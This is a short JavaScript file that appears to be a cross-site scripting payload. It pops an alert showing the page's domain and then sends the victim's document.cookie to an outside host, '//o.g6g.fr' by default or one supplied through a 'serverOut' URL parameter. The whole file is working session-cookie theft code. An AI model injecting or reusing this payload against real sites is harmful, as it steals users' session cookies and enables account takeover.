function main(){

    alert(document.domain)
    const urlParams = new URLSearchParams(window.location.search);
    let serverOut = urlParams.get("serverOut")?? "//o.g6g.fr";
    if (!!serverOut){
        fetch(`${serverOut}?session=${encodeURIComponent(document.cookie)}`);
    }
}

main();